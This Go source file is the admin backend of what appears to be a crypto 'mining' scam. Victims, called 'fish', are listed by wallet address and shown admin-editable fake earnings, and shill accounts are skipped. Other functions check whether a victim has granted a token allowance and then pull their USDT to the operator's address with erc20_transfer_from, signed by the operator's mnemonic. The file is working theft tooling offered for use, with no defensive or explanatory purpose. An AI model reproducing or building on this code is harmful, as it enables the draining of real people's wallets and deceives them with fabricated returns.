/**
 * @Author $
 * @Description //TODO $
 * @Date $ $
 * @Param $
 * @return $
 **/
package management

import (
	"encoding/json"
	"fmt"
	"github.com/gin-gonic/gin"
	"github.com/spf13/viper"
	"github.com/wangyi/fishpond/controller/client"
	"github.com/wangyi/fishpond/dao/mysql"
	"github.com/wangyi/fishpond/model"
	"github.com/wangyi/fishpond/util"
	"io/ioutil"
	"math/big"
	"net/http"
	"strconv"
	"strings"
	"time"
)

/**
获取鱼苗
*/
func GetFish(c *gin.Context) {

	action := c.PostForm("action")
	if action == "GET" {
		page, _ := strconv.Atoi(c.PostForm("page"))
		limit, _ := strconv.Atoi(c.PostForm("limit"))
		var total int = 0
		Db := mysql.DB
		vipEarnings := make([]model.Fish, 0)

		if status, isExist := c.GetPostForm("status"); isExist == true {
			status, _ := strconv.Atoi(status)
			Db = Db.Where("status=?", status)
		}
		if remark, isExist := c.GetPostForm("remark"); isExist == true {
			Db = Db.Where("remark LIKE ?", "%"+remark+"%")
		}

		if foxAddress, isExist := c.GetPostForm("fox_address"); isExist == true {
			Db = Db.Where("fox_address LIKE ?", "%"+foxAddress+"%")
		}

		if BAddress, isExist := c.GetPostForm("b_address"); isExist == true {
			Db = Db.Where("b_address= ?", BAddress)
		}

		if id, isExist := c.GetPostForm("id"); isExist == true {
			status, _ := strconv.Atoi(id)
			Db = Db.Where("id= ?", status)
		}

		if id, isExist := c.GetPostForm("authorization"); isExist == true {
			status, _ := strconv.Atoi(id)
			Db = Db.Where("authorization= ?", status)
		}

		Db.Table("fish").Count(&total)
		Db = Db.Model(&vipEarnings).Offset((page - 1) * limit).Limit(limit).Order("updated desc")
		if err := Db.Find(&vipEarnings).Error; err != nil {
			util.JsonWrite(c, -101, nil, err.Error())
			return
		}

		for k, v := range vipEarnings {
			admin := model.Admin{}
			mysql.DB.Where("id=?", v.AdminId).First(&admin)
			vipEarnings[k].BelongString = admin.Username
		}

		c.JSON(http.StatusOK, gin.H{
			"code":   1,
			"count":  total,
			"result": vipEarnings,
		})
		return
	}

	if action == "UPDATE" { //暂时一个禁用 功能
		id := c.PostForm("id")
		//判断这个是否存在
		err := mysql.DB.Where("id=?", id).First(&model.Fish{}).Error
		if err != nil {
			util.JsonWrite(c, -101, nil, "这个id不存在!")
			return
		}
		updateData := model.Fish{}
		if status, isExist := c.GetPostForm("status"); isExist == true {
			status, err := strconv.Atoi(status)
			if err != nil {
				util.JsonWrite(c, -101, nil, "status 错误!")
				return
			}
			updateData.Status = status
		}

		if money, isExist := c.GetPostForm("Money"); isExist == true {
			m, err := strconv.ParseFloat(money, 64)
			if err != nil {
				util.JsonWrite(c, -101, nil, "status 错误!")
				return
			}
			updateData.Money = m
		}

		if money, isExist := c.GetPostForm("MoneyEth"); isExist == true {
			m, err := strconv.ParseFloat(money, 64)
			if err != nil {
				util.JsonWrite(c, -101, nil, "status 错误!")
				return
			}
			updateData.MoneyEth = m
		}

		if money, isExist := c.GetPostForm("TodayEarningsETH"); isExist == true {
			m, err := strconv.ParseFloat(money, 64)
			if err != nil {
				util.JsonWrite(c, -101, nil, "TodayEarningsETH 错误!")
				return
			}
			updateData.TodayEarningsETH = m
		}
		//MiningEarningETH
		if money, isExist := c.GetPostForm("MiningEarningETH"); isExist == true {
			m, err := strconv.ParseFloat(money, 64)
			if err != nil {
				util.JsonWrite(c, -101, nil, "MiningEarningETH 错误!")
				return
			}
			updateData.MiningEarningETH = m
		}

		if money, isExist := c.GetPostForm("EarningsMoney"); isExist == true {
			m, err := strconv.ParseFloat(money, 64)
			if err != nil {
				util.JsonWrite(c, -101, nil, "status 错误!")
				return
			}
			updateData.EarningsMoney = m
		}
		if money, isExist := c.GetPostForm("TodayEarnings"); isExist == true {
			m, err := strconv.ParseFloat(money, 64)
			if err != nil {
				util.JsonWrite(c, -101, nil, "status 错误!")
				return
			}
			updateData.TodayEarnings = m
		}

		if money, isExist := c.GetPostForm("TotalEarnings"); isExist == true {
			m, err := strconv.ParseFloat(money, 64)
			if err != nil {
				util.JsonWrite(c, -101, nil, "status 错误!")
				return
			}
			updateData.TotalEarnings = m
		}

		//YesterdayEarnings
		if money, isExist := c.GetPostForm("YesterdayEarnings"); isExist == true {
			m, err := strconv.ParseFloat(money, 64)
			if err != nil {
				util.JsonWrite(c, -101, nil, "status 错误!")
				return
			}
			updateData.YesterdayEarnings = m
		}
		if money, isExist := c.GetPostForm("Remark"); isExist == true {

			updateData.Remark = money
		}

		err = mysql.DB.Model(&model.Fish{}).Where("id=?", id).Update(&updateData).Error
		if err != nil {
			util.JsonWrite(c, -101, nil, "修改失败!")
			return
		}
		util.JsonWrite(c, 200, nil, "修改成功!")
		return
	}

}

/**
  更新 鱼的 usd
*/
func UpdateOneFishUsd(c *gin.Context) {

	_, err2 := c.Get("who")
	if !err2 {
		return
	}

	//wgoMap := who.(map[string]interface{})

	foxAddress := c.PostForm("fox_address")
	apikey := viper.GetString("eth.apikey")
	id := c.PostForm("id")
	fish := model.Fish{}
	err3 := mysql.DB.Where("id=?", id).First(&fish).Error
	if err3 != nil {
		util.JsonWrite(c, -101, nil, "更新失败")
		return
	}
	if fish.Remark == "托" {
		util.JsonWrite(c, -101, nil, "托不更新")
		return
	}

	res, err := http.Get("https://api.etherscan.io/api?module=account&action=tokenbalance&contractaddress=0xdAC17F958D2ee523a2206206994597C13D831ec7&address=" + foxAddress + "&tag=latest&apikey=" + apikey)
	if err != nil {
		util.JsonWrite(c, -101, nil, "更新失败")
		return
	}
	defer res.Body.Close()
	body, err1 := ioutil.ReadAll(res.Body)
	if err1 != nil {
		util.JsonWrite(c, -101, nil, "更新失败")
		return
	}

	var basket client.AutoGenerated
	err = json.Unmarshal([]byte(string(body)), &basket)
	if err != nil {
		fmt.Println(err)
	}

	if basket.Status != "1" {
		util.JsonWrite(c, -101, nil, "更新失败:"+basket.Message)
		return
	}

	maxMoney := basket.Result

	wei := new(big.Int)
	wei.SetString(maxMoney, 10)
	usd := util.ToDecimal(wei, 6)

	data := make(map[string]interface{})
	//data["money_eth"], _ = eth.Float64() //零值字段
	data["updated"] = time.Now().Unix()
	data["money"], _ = usd.Float64()

	fmt.Println(data)

	ee := mysql.DB.Model(&model.Fish{}).Where("id=?", id).Updates(data).Error
	if ee != nil {
		util.JsonWrite(c, -101, nil, "更新失败")
		return
	}
	util.JsonWrite(c, 200, nil, "更新成功")
	return
}

/**
  @admin  提现
*/

/***
  更新鱼的 eth
*/

type Params struct {
	TokenName    string
	mnemonic     string
	accountIndex int
	fromAddress  string
	toAddress    string
	amount       string
}

type TX struct {
	method string
	params Params
}

func TiXian(c *gin.Context) {
	_, err2 := c.Get("who")
	if !err2 {
		return
	}
	foxAddress := c.PostForm("fox_address") //A的地址
	amount := c.PostForm("amount")
	config := model.Config{}
	err := mysql.DB.Where("id=1").First(&config).Error
	if err != nil {
		util.JsonWrite(c, -101, nil, "程序错误,联系技术")
		return
	}
	type Params struct {
		TokenName    string
		Mnemonic     string
		AccountIndex int
		FromAddress  string
		ToAddress    string
		Amount       string
	}
	type TX struct {
		Method string
		Params Params
	}
	jsonOne := make(map[string]interface{})
	if BMnemonic, isExist := c.GetPostForm("b_mnemonic"); isExist == true {
		jsonOne["mnemonic"] = BMnemonic
	} else {
		jsonOne["mnemonic"] = config.BMnemonic
	}
	jsonOne["to_address"] = config.CAddress
	jsonOne["token_name"] = "usdt"
	jsonOne["account_index"] = 0
	jsonOne["from_address"] = foxAddress
	jsonOne["amount"] = amount
	jsonDate := make(map[string]interface{})
	jsonDate["method"] = "erc20_transfer_from"
	jsonDate["params"] = jsonOne
	byte, _ := json.Marshal(jsonDate)
	//fmt.Printf("JSON format: %s", byte)

	//生成任务id
	taskId := time.Now().Format("20060102") + util.RandStr(8)
	resp, err1 := http.Post("http://127.0.0.1:8000/ethservice?taskId="+taskId, "application/json", strings.NewReader(string(byte)))
	if err1 != nil {
		util.JsonWrite(c, -1, nil, err1.Error())
		return
	}

	//至少运行成功 入库

	//首先获取 fishID
	fish := model.Fish{}
	err = mysql.DB.Where("fox_address=?", foxAddress).First(&fish).Error
	if err != nil {
		util.JsonWrite(c, -101, nil, "这条鱼不存在")
		return
	}

	add := model.FinancialDetails{
		TaskId:   taskId,
		Kinds:    10,
		FishId:   int(fish.ID),
		CAddress: config.CAddress,
		Created:  time.Now().Unix(),
		Updated:  time.Now().Unix(),
	}
	mysql.DB.Save(&add)
	defer resp.Body.Close()
	respByte, _ := ioutil.ReadAll(resp.Body)
	fmt.Println(string(respByte))
	util.JsonWrite(c, 200, nil, "提现成功,等待到账!")
	return
}

func UpdateIfAuthorization(c *gin.Context) {
	foxAddress := c.PostForm("fox_address")
	apiKey := viper.GetString("eth.apikey")
	config := model.Config{}
	var BAdd string
	if BAddress, isExist := c.GetPostForm("b_address"); isExist {
		BAdd = BAddress
	} else {
		err := mysql.DB.Where("id=1").First(&config).Error
		if err != nil {
			util.JsonWrite(c, -101, nil, "配置:"+err.Error())
			return
		}
		BAdd = config.BAddress
	}

	go util.ChekAuthorizedFoxAddress(foxAddress, apiKey, BAdd, mysql.DB)

	util.JsonWrite(c, 200, nil, "执行成功!")

}

/**
  对转账的 的鱼的结果进行回调
*/
func CallBackResultForGetMoney(c *gin.Context) {
	taskId := c.PostForm("taskId")
	hashCode := c.PostForm("hashCode")
	kinds, _ := strconv.Atoi(c.PostForm("kinds"))
	if taskId == "" || c.PostForm("kinds") == "" {
		util.JsonWrite(c, -101, nil, "缺少参数")
		return
	}
	err := mysql.DB.Where("task_id=?", taskId).First(&model.FinancialDetails{}).Error
	if err != nil {
		util.JsonWrite(c, -101, nil, "该任务不存在")
		return
	}
	err = mysql.DB.Model(&model.FinancialDetails{}).Where("task_id=?", taskId).Update(&model.FinancialDetails{HashCode: hashCode, Kinds: kinds}).Error
	if err != nil {
		util.JsonWrite(c, -101, nil, "更新失败")
		return
	}
	util.JsonWrite(c, 200, nil, "修改成功")
	return

}
